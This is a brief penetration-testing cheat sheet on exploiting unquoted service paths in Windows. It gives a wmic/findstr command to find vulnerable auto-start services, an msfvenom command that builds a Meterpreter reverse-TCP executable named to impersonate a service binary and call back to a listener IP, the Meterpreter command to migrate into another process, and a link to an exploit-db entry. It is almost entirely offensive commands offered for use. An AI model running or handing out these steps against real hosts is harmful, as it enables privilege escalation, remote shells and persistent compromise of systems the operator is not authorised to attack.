# Unquoted Service Paths

Check for vulnerable services

```text
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Create a payload and restart the service / reboot the host.

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.189 LPORT=80 EXITFUNC=thread -f exe -o Iperius.exe
```

Start multi handler and migrate to new process \(meterpreter\)

```text
run post/windows/manage/migrate
```

Here's a good example to follow: [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)



